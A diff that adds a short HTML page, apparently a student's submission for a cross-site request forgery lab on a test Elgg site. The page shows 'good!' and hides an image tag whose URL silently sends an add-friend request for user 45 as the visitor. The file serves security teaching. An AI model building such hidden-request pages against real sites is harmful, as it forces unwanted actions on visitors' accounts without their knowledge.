@@ -1,0 +1,13 @@
+<html>
+<head>
+    <title>
+        lm's lab3 
+    </title>
+      
+</head>
+<body>
+     good!
+     <img src="http://www.csrflabelgg.com/action/friends/add?friend=45" hidden />
+      </body>
+
+</html>
